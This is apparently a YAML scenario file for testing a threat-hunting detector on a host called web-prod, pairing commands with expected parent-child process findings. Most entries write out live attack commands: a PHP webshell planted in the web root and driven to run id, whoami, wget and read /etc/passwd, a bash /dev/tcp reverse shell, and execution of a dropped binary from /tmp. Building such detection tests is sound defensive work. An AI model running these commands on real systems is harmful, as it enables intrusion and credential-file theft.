scenarios:
- name: RCE — webshell ruleaza id
  path: hunt
  ground_truth: attack
  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/h.php
    >/dev/null && curl -s "http://localhost/h.php?c=id" >/dev/null && sudo rm /var/www/html/h.php
  finding:
    host: web-prod
    kind: new_parent_child
    detail:
      parent: dash
      child: id
    rarity_score: 1.0
- name: RCE — webshell ruleaza whoami
  path: hunt
  ground_truth: attack
  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/h.php
    >/dev/null && curl -s "http://localhost/h.php?c=whoami" >/dev/null && sudo rm
    /var/www/html/h.php
  finding:
    host: web-prod
    kind: new_parent_child
    detail:
      parent: dash
      child: whoami
    rarity_score: 1.0
- name: RCE — webshell citeste /etc/passwd
  path: hunt
  ground_truth: attack
  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/h.php
    >/dev/null && curl -s "http://localhost/h.php?c=cat+/etc/passwd" >/dev/null &&
    sudo rm /var/www/html/h.php
  finding:
    host: web-prod
    kind: new_parent_child
    detail:
      parent: dash
      child: cat
    rarity_score: 1.0
- name: Reverse shell — bash /dev/tcp
  path: hunt
  ground_truth: attack
  generate: timeout 2 bash -c "bash -i >& /dev/tcp/127.0.0.1/9999 0>&1" 2>/dev/null;
    echo done
  finding:
    host: web-prod
    kind: new_parent_child
    detail:
      parent: bash
      child: bash
    rarity_score: 0.9
- name: Executie din /tmp — binar aruncat
  path: hunt
  ground_truth: attack
  generate: cp /bin/true /tmp/.x 2>/dev/null && /tmp/.x; rm -f /tmp/.x
  finding:
    host: web-prod
    kind: new_parent_child
    detail:
      parent: bash
      child: .x
    rarity_score: 1.0
- name: Download payload — webshell lanseaza wget
  path: hunt
  ground_truth: attack
  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/h.php
    >/dev/null && curl -s "http://localhost/h.php?c=wget+-q+http://127.0.0.1/" >/dev/null
    && sudo rm /var/www/html/h.php
  finding:
    host: web-prod
    kind: new_parent_child
    detail:
      parent: dash
      child: wget
    rarity_score: 1.0
- name: Admin curl catre localhost
  path: hunt
  ground_truth: benign
  generate: curl -s http://localhost/ >/dev/null
  finding:
    host: web-prod
    kind: new_parent_child
    detail:
      parent: bash
      child: curl
    rarity_score: 0.8
